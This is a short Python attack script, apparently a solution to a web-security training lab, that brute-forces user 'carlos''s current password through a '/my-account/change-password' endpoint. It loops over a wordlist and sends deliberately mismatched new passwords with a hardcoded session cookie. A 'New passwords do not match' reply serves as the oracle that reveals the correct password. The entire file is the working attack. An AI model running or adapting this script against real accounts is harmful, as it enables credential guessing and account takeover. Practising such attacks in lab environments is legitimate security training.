import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

password_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\passwords.txt"


def perform_request(url,password):
    uri = "/my-account/change-password"
    username = "carlos"
    new_password1 = "password1"
    new_password2 = "password2"
    cookies = {'session' : 'V49BS5nv4X5xjGuXs8UvzmbFVR9RcgNO'}
    data = {'username' : username , 'current-password' : password, 'new-password-1' : new_password1, 'new-password-2' : new_password2}
    r = requests.post(url + uri, data=data, cookies=cookies, verify=False, proxies=proxies)
    return r


def password_enumerator(url,password_list):
    with open(password_list, 'r') as p:
        passwords = p.readlines()
        for x in passwords:
            password = x.split("\n")[0]
            sys.stdout.write("[+] Sto testando la password %s\r" % password)
            sys.stdout.flush()
            response = perform_request(url,password)
            sys.stdout.write("\033[K")
            if "New passwords do not match" in response.text:
                p.close()
                return password
        p.close()
        return False




if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    password = password_enumerator(url, password_list)
    if password:
        print("\n[+] La password è " + password)
    else:
        print("\n[-] Impossibile individuare la password")